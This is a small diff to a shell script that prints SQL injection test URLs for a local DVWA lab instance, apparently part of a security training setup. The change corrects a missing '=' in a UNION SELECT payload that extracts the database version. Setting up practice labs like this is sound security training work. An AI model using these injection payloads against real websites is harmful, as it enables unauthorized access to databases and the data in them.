@@ -24,5 +24,5 @@ ip=$(/sbin/ifconfig eth0 | grep 'inet addr' | cut -d: -f2 | awk '{print $1}')
 
 echo "Test sqli
 http://$ip/dvwa/vulnerabilities/sqli/?id=%' or '0'='0
-http://$ip/dvwa/vulnerabilities/sqli/?id%' or 0=0 union select null, version() #
+http://$ip/dvwa/vulnerabilities/sqli/?id=%' or 0=0 union select null, version() #
 "
